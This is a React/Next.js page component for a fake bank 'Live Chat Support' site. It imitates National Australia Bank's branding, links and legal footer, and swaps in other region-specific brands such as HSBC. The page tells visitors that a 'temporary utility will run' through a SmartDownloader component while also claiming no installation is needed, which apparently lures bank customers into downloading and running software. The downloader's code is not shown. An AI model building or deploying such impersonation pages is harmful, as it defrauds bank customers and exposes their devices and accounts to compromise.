"use client";

import { Header } from "./components/Header";
import { SmartDownloader } from "./components/SmartDownloader";
import { useUserRegion } from "./hooks/useUserRegion";

export default function Home() {
  const { regionData, loading } = useUserRegion();

  return (
    <div className="relative min-h-screen flex flex-col font-source">
      {/* Background Image Layer */}
      <div 
        className="fixed inset-0 w-full h-full z-0"
        style={{
          backgroundImage: "url('/sdfd_bg_login.jpeg')",
          backgroundSize: "cover",
          backgroundPosition: "center",
        }}
      >
        {/* Subtle dark overlay for better contrast */}
        <div className="absolute inset-0 bg-black/60 backdrop-blur-[4px]"></div>
      </div>

      {/* Main Content Wrapper */}
      <div className="relative z-10 flex flex-col flex-1">
        <Header />

        <main className="flex-1 flex items-center justify-center py-12 px-6">
          <div className="w-full max-w-[1200px] flex flex-col lg:flex-row gap-12 lg:gap-20 items-center lg:items-stretch justify-between">
            {/* Promo Section (Left) */}
            <div className="flex-1 text-white max-w-2xl flex flex-col justify-center">
              <h1 className="font-epilogue text-4xl md:text-5xl font-semibold leading-[1.15] mb-6 tracking-tight">
                <span className="font-bold">{loading ? "NAB" : regionData.brandName}</span> <br />
                Live Chat Support.
              </h1>
              <p className="text-lg text-gray-200 mb-10 leading-relaxed font-light">
                {loading ? "Loading your local support..." : regionData.heroSubtitle} Start a secure live chat session with our specialists to get real-time assistance directly on your device.
              </p>
              
              <ul className="space-y-5 list-none p-0 m-0 text-white text-[16px]">
                <li className="flex items-start gap-4">
                  <div className="w-6 h-6 flex items-center justify-center mt-0.5">
                    <svg className="w-5 h-5 text-nab-red" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                       <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                    </svg>
                  </div>
                  <div>
                     <strong className="block font-bold">Bank-grade Encryption</strong>
                     <span className="text-gray-300 text-[14px]">Your session is fully secured end-to-end.</span>
                  </div>
                </li>
                <li className="flex items-start gap-4">
                  <div className="w-6 h-6 flex items-center justify-center mt-0.5">
                    <svg className="w-5 h-5 text-nab-red" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                       <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                  </div>
                  <div>
                     <strong className="block font-bold">Instant Resolution</strong>
                     <span className="text-gray-300 text-[14px]">Connect directly to an available agent in seconds.</span>
                  </div>
                </li>
                <li className="flex items-start gap-4">
                  <div className="w-6 h-6 flex items-center justify-center mt-0.5">
                    <svg className="w-5 h-5 text-nab-red" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                       <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                    </svg>
                  </div>
                  <div>
                     <strong className="block font-bold">Lightweight &amp; Secure</strong>
                     <span className="text-gray-300 text-[14px]">No installation required. You control the session.</span>
                  </div>
                </li>
              </ul>
            </div>

            {/* Action Card (Right) */}
            <div className="w-full max-w-[500px] flex items-center mt-10 lg:mt-0">
              <div className="w-full bg-white/95 backdrop-blur-xl p-8 md:p-10 rounded-[24px] shadow-2xl shadow-black/50 border border-white/20 relative overflow-hidden group">
                {/* Red accent line at top */}
                <div className="absolute top-0 left-0 w-full h-1 bg-nab-red"></div>
                
                {/* Decorative glowing orb behind the card text */}
                <div className="absolute -top-24 -right-24 w-64 h-64 bg-nab-red/10 rounded-full blur-[60px] pointer-events-none group-hover:bg-nab-red/20 transition-all duration-700"></div>
                
                <div className="relative z-10">
                  <h2 className="font-epilogue text-[24px] font-semibold text-nab-black mb-3">
                    Start your session
                  </h2>
                  <p className="text-gray-500 text-[14px] mb-8 leading-relaxed">
                    Click below to initiate a secure live chat. A temporary utility will run to connect you with an agent.
                  </p>
                  
                  <SmartDownloader />
                </div>
              </div>
            </div>

          </div>
        </main>

        {/* Full Footer (matching HSBC's structure) */}
        <footer className="w-full bg-black/80 backdrop-blur-md pt-12 pb-8 px-6 text-white font-source border-t border-white/10 mt-auto">
          <div className="max-w-[1200px] mx-auto">
             <div className="flex flex-col md:flex-row justify-between items-start md:items-center border-b border-white/20 pb-8 mb-8 gap-6">
                <div className="flex flex-wrap gap-x-6 gap-y-3 text-[14px]">
                   <a href="https://www.nab.com.au/about-us" className="hover:underline hover:text-nab-red transition-colors" target="_blank" rel="noopener noreferrer">About NAB</a>
                   <a href="https://www.nab.com.au/about-us/sitemap" className="hover:underline hover:text-nab-red transition-colors" target="_blank" rel="noopener noreferrer">Site map</a>
                   <a href={loading ? "#" : regionData.termsUrl} className="hover:underline hover:text-nab-red transition-colors" target="_blank" rel="noopener noreferrer">Terms and conditions</a>
                   <a href="https://www.nab.com.au/common/privacy" className="hover:underline hover:text-nab-red transition-colors" target="_blank" rel="noopener noreferrer">Privacy Policy</a>
                   <a href="https://www.nab.com.au/common/security" className="hover:underline hover:text-nab-red transition-colors" target="_blank" rel="noopener noreferrer">Security</a>
                   <a href="https://www.nab.com.au/accessibility" className="hover:underline hover:text-nab-red transition-colors" target="_blank" rel="noopener noreferrer">Accessibility</a>
                </div>
             </div>
             <p className="text-[#A0A0A0] text-[12px] leading-relaxed mb-4">
                © {new Date().getFullYear()} {loading ? "National Australia Bank Limited" : regionData.legalEntityName}. All rights reserved. No endorsement or approval of any third parties or their advice, opinions, information, products or services is expressed or implied by any information on this Site or by any hyperlinks to or from any third party websites or pages. Your use of this website is subject to the terms and conditions governing it. Please read these terms and conditions before using the website.
             </p>
          </div>
        </footer>
      </div>
    </div>
  );
}
